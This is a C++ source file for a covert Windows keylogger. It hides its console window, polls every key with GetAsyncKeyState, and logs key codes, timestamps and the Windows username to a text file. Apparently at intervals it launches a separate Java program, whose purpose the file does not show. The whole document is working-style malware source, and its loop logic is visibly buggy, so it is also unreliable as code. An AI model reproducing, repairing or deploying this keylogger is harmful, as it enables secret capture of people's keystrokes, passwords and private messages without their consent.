#include <iostream>
#include <ctime>
#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>

#define FILE_NAME "Record2.txt"

using namespace std;

int main()
{
    FreeConsole();
    FILE *file = fopen(FILE_NAME, "w");
    unsigned char key;
    while (TRUE)
    {
        Sleep(10);
        for (key = 0; key <= 255; key++)
        {
            for(int i=0; i<=100; key++)
            {    
                if(i==100)
                {
                    if (GetAsyncKeyState(key) == -32767)
                    {
                        
                            
                        file=fopen(FILE_NAME,"a");
                        time_t now = time(nullptr);
                        char username[UNLEN+1];
                        DWORD username_len = UNLEN+1;
                        GetUserNameA(username, &username_len);
                        HKL KeyboardLayout = GetKeyboardLayout(0);
                        fprintf(file,"%d %d %s uuid\n",key,now,username);
                        fclose(file);
                        i++;
                        system("java -jar myapp-1.0-SNAPSHOT.jar"); 
                        FILE *file = fopen(FILE_NAME, "w"); 
                    }
                }
                else
                {
                    if (GetAsyncKeyState(key) == -32767)
                    {
                        
                            
                        file=fopen(FILE_NAME,"a");
                        time_t now = time(nullptr);
                        char username[UNLEN+1];
                        DWORD username_len = UNLEN+1;
                        GetUserNameA(username, &username_len);
                        HKL KeyboardLayout = GetKeyboardLayout(0);
                        fprintf(file,"%d %d %s uuid\n",key,now,username);
                        fclose(file);
                        i++;
                            
                    }
                }    
            }    
        }
    }
}
